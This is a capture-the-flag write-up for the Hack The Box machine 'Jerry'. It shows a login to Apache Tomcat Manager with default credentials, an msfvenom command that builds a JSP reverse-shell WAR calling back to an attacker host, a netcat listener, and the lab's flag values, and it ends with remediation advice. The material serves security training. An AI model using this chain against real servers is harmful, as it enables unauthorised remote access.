# HTB - Jerry

**Difficulty:** Easy  
**OS:** Windows  
**Status:** Retired ✅

---

## Summary

Jerry is an Easy Windows machine running Apache Tomcat 7.0.88 with default credentials enabled on the Manager panel. By uploading a malicious WAR file through the Manager, a reverse shell is obtained. Since Tomcat runs as Administrator, both flags are accessible immediately with no privilege escalation needed.

---

## Tools Used

- Nmap
- msfvenom
- Netcat

---

## Steps

### 1. Enumeration

```bash
nmap -sV -sC --min-rate 5000 10.129.136.9
```

**Open ports:**
- 8080 → Apache Tomcat 7.0.88

---

### 2. Tomcat Manager Access

Navigated to the Tomcat Manager panel:

```
http://10.129.136.9:8080/manager/html
```

Logged in with default credentials: **tomcat / s3cret**

Access granted to the Tomcat Web Application Manager.

---

### 3. Generating the Reverse Shell

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.17.215 LPORT=4444 -f war -o shell.war
```

---

### 4. Setting Up the Listener

```bash
nc -lvnp 4444
```

---

### 5. Deploying the WAR File

Uploaded `shell.war` through the Manager panel using the **"WAR file to deploy"** section and clicked **Deploy**.

Then visited:

```
http://10.129.136.9:8080/shell/
```

Reverse shell received as `C:\apache-tomcat-7.0.88>` running on **Windows Server 2012 R2**.

---

### 6. Flags

```bash
type "C:\Users\Administrator\Desktop\flags\*.txt"
```

- **user.txt** → `7004dbcef0f854e0fb401875f26ebd00`
- **root.txt** → `04a8b36e1545a455393d067e772fe90e`

Both flags were in the same folder — no privilege escalation needed since Tomcat was already running as Administrator.

---

## What I Learned

- Default credentials on Tomcat Manager are a critical misconfiguration found in real environments
- A WAR file is a deployable Java web application — it can contain a reverse shell
- If a service runs as Administrator, you get full access immediately with no privilege escalation needed
- Always check management panels on non-standard ports like 8080

---

## Remediation

- Change default Tomcat credentials immediately
- Restrict access to the Manager panel — it should never be publicly exposed
- Run Tomcat as a low-privilege user, not as Administrator
- Use a firewall to block port 8080 from external access
